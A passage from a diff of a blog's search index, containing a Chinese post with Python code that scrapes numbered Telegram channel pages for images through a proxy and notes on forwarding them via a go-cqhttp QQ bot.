class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_latest_image_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取最新的图片编号&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 实现省略.</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">self, image_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;下载指定编号的图片&quot;&quot;&quot;</span></span><br><span class="line">        target_url = <span class="string">f&quot;<span class="subst">&#123;prefix_url&#125;</span><span class="subst">&#123;image_num&#125;</span><span class="subst">&#123;suffix_url&#125;</span>&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(target_url, proxies=proxies, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        pic_data = soup.find_all(<span class="string">&#x27;a&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;js-message_photo&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pic_data:</span><br><span class="line">            img_style = pic_data[<span class="number">0</span>][<span class="string">&#x27;style&#x27;</span>]</span><br><span class="line">            img_url = re.search(<span class="string">&#x27;https:.*?jpg&#x27;</span>, img_style).group()</span><br><span class="line">            </span><br><span class="line">            img_data = <span class="variable language_">self</span>.session.get(img_url, proxies=proxies, headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/data/images/<span class="subst">&#123;image_num&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_download</span>(<span class="params">self, start_num, end_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;批量下载图片&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在下载图片 #<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.download_image(num)</span><br></pre></td></tr></table></figure>
+
+<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
+<li><strong>代理配置</strong>：使用SOCKS5代理访问Telegram</li>
+<li><strong>异常处理</strong>：检测<code>tgme_widget_message_error</code>类判断无效消息</li>
+<li><strong>图片识别</strong>：通过BeautifulSoup解析DOM结构获取图片URL</li>
+<li><strong>文件存储</strong>：将下载的图片按编号保存到本地</li>
+</ol>
+<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2><p>将爬虫功能集成到go-cqhttp机器人的基本思路：</p>
+<ol>
+<li>设置定时任务定期检查新图片</li>
+<li>下载新图片到本地存储</li>
+<li>通过QQ机器人接口发送图片</li>
+<li>记录已处理的图片编号防止重复</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Daily</category>
+      </categories>
+      <tags>
+        <tag>Daily life</tag>
       </tags>
   </entry>
 </search>
